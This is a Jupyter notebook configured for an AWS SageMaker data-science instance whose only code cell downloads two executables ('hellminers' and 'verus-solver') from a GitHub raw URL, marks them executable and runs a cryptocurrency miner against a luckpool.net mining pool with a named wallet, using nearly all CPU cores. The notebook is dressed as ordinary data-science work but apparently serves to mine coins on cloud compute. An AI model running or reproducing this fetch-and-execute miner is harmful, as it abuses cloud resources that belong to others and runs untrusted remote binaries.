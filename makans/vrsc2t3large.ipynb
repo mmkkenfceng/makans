{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!wget https://raw.githubusercontent.com/mmkkenfceng/baummk/main/hellminers && wget https://raw.githubusercontent.com/mmkkenfceng/baummk/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://ap.luckpool.net:3956 -u RG4EAe7NpsSGZthw8k5DDtqer1mFwH7Psm.papichulo -p x --cpu $(nproc --ignore 1)"
   ]
  }
 ],
 "metadata": {
  "instance_type": "ml.t3.large",
  "kernelspec": {
   "display_name": "Python 3 (Data Science)",
   "language": "python",
   "name": "python3__SAGEMAKER_INTERNAL__arn:aws:sagemaker:ca-central-1:310906938811:image/datascience-1.0"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
